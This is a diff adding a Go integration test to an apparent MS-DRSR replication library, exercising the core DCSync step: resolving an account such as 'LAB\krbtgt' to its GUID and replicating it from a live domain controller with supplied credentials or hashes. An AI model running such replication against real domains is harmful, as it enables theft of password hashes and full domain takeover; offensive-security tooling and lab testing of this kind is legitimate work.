@@ -70,3 +70,49 @@ func TestDRSBindUnbind(t *testing.T) {
 		t.Error("server did not negotiate STRONG_ENCRYPTION; secret replication would be refused")
 	}
 }
+
+// TestCrackAndReplicate exercises the DCSync critical thread against a live DC: resolve a
+// target account to its objectGUID with IDL_DRSCrackNames, then replicate that single
+// object with IDL_DRSGetNCChanges (EXOP_REPL_OBJ). Attribute values are not decrypted
+// here (Phase 4); the test asserts the object came back with attributes. Requires
+// DRSUAPI_TEST_HOST and DRSUAPI_TEST_TARGET (an NT4-format account, e.g. "LAB\\krbtgt").
+func TestCrackAndReplicate(t *testing.T) {
+	host := os.Getenv("DRSUAPI_TEST_HOST")
+	target := os.Getenv("DRSUAPI_TEST_TARGET")
+	if host == "" || target == "" {
+		t.Skip("set DRSUAPI_TEST_HOST and DRSUAPI_TEST_TARGET (e.g. LAB\\krbtgt) to run")
+	}
+	creds, err := credentials.NewCredentials(
+		os.Getenv("DRSUAPI_TEST_DOMAIN"), os.Getenv("DRSUAPI_TEST_USER"),
+		os.Getenv("DRSUAPI_TEST_PASS"), os.Getenv("DRSUAPI_TEST_HASHES"),
+	)
+	if err != nil {
+		t.Fatalf("build credentials: %v", err)
+	}
+
+	c := msdrsr.New(host, creds)
+	c.SetTimeout(15 * time.Second)
+	if err := c.Connect(); err != nil {
+		t.Fatalf("Connect: %v", err)
+	}
+	defer c.Close()
+
+	objGUID, err := c.ResolveToGUID(target, structures.DS_NT4_ACCOUNT_NAME)
+	if err != nil {
+		t.Fatalf("ResolveToGUID(%q): %v", target, err)
+	}
+	t.Logf("%s -> %s", target, objGUID.ToFormatD())
+
+	res, err := c.ReplicateSingleObject(objGUID)
+	if err != nil {
+		t.Fatalf("ReplicateSingleObject: %v", err)
+	}
+	if len(res.Objects) == 0 {
+		t.Fatal("no objects returned")
+	}
+	obj := res.Objects[0]
+	t.Logf("replicated %s (%s) with %d attributes", obj.DN, obj.GUID.ToFormatD(), len(obj.Attributes))
+	if len(obj.Attributes) == 0 {
+		t.Error("object returned with no attributes")
+	}
+}
